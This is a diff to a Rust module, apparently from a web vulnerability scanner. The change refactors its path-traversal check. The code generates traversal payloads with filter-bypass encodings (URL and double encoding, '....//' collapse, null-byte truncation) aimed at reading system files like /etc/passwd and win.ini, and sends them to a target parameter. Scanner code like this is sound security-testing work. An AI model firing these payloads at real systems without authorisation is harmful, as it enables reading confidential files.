@@ -45,28 +45,33 @@ lazy_static! {
         .collect();
 }
 
-/// Generate traversal payloads for a target file across depths and encodings.
+// Two traversal depths suffice: a deep climb (8) covers every shallower depth
+// because extra `../` are idempotent once the path reaches the filesystem root,
+// while a shallow climb (4) hedges against filters that strip or length-cap long
+// sequences. The old [3,5,7,8,10] sweep was ~5x the requests for no extra reach.
+const DEPTHS: [usize; 2] = [8, 4];
+
+/// Full traversal payload set for the PRIMARY target across depths + encodings.
+/// This is where the filter-bypass breadth lives (plain, collapse, single/double
+/// URL-encoding, null-byte truncation).
 fn payloads(file: &str, windows: bool) -> Vec<String> {
     let mut out = Vec::new();
-    // Absolute path (no traversal needed if the param is used as a raw path).
     if windows {
         out.push("c:\\windows\\win.ini".to_string());
         out.push("c:/windows/win.ini".to_string());
+        let bs = file.replace('/', "\\");
+        for depth in DEPTHS {
+            out.push(format!("{}{bs}", "..\\".repeat(depth))); // plain
+            out.push(format!("{}{bs}", "....\\\\".repeat(depth))); // collapse bypass
+            out.push(format!("{}{}", "..%5c".repeat(depth), file.replace('/', "%5c"))); // url-enc
+        }
     } else {
-        out.push(format!("/{file}"));
-    }
-
-    for depth in [3usize, 5, 7, 8, 10] {
-        if windows {
-            let up = "..\\".repeat(depth);
-            out.push(format!("{up}{}", file.replace('/', "\\")));
-            out.push(format!("{}{}", "....\\\\".repeat(depth), file.replace('/', "\\")));
-            out.push(format!("{}{}", "..%5c".repeat(depth), file.replace('/', "%5c")));
-        } else {
+        out.push(format!("/{file}")); // absolute (raw-path use)
+        for depth in DEPTHS {
             let up = "../".repeat(depth);
             out.push(format!("{up}{file}")); // ../../../etc/passwd
             out.push(format!("{up}{file}\u{0}")); // null-byte truncation
-            out.push(format!("{}{file}", "....//".repeat(depth))); // ....// bypass
+            out.push(format!("{}{file}", "....//".repeat(depth))); // ....// collapse bypass
             out.push(format!("{}{}", "..%2f".repeat(depth), file.replace('/', "%2f"))); // url-enc slash
             out.push(format!("{}{}", "%2e%2e%2f".repeat(depth), file.replace('/', "%2f"))); // url-enc dots
             out.push(format!("{}{}", "..%252f".repeat(depth), file.replace('/', "%252f"))); // double-enc
@@ -75,11 +80,38 @@ fn payloads(file: &str, windows: bool) -> Vec<String> {
     out
 }
 
+/// Compact payload set for FALLBACK targets. Once the primary target has probed
+/// every encoding against this parameter, a fallback file faces the same filter —
+/// so only the filename changes. We try just absolute + a deep plain/encoded
+/// climb to confirm the alternate file, not re-run the whole bypass matrix.
+fn payloads_fallback(file: &str, windows: bool) -> Vec<String> {
+    if windows {
+        vec![
+            "c:\\windows\\win.ini".to_string(),
+            format!("{}{}", "..\\".repeat(8), file.replace('/', "\\")),
+            format!("{}{}", "..%5c".repeat(8), file.replace('/', "%5c")),
+        ]
+    } else {
+        vec![
+            format!("/{file}"),
+            format!("{}{file}", "../".repeat(8)),
+            format!("{}{}", "..%2f".repeat(8), file.replace('/', "%2f")),
+        ]
+    }
+}
+
 /// Check a parameter for path traversal / LFI.
 pub async fn check_path_traversal(request: &Request<'_>) -> Result<Option<PathTravVector>> {
     for (i, target) in TARGETS.iter().enumerate() {
         let sig = &SIGS[i];
-        for payload in payloads(target.file, target.windows) {
+        // First target carries the full encoding-bypass matrix; later targets
+        // (existence fallbacks under the same filter) use the compact set.
+        let payloads = if i == 0 {
+            payloads(target.file, target.windows)
+        } else {
+            payloads_fallback(target.file, target.windows)
+        };
+        for payload in payloads {
             let page = request.query_page(&payload).await?;
             if sig.is_match(&page) {
                 return Ok(Some(PathTravVector {
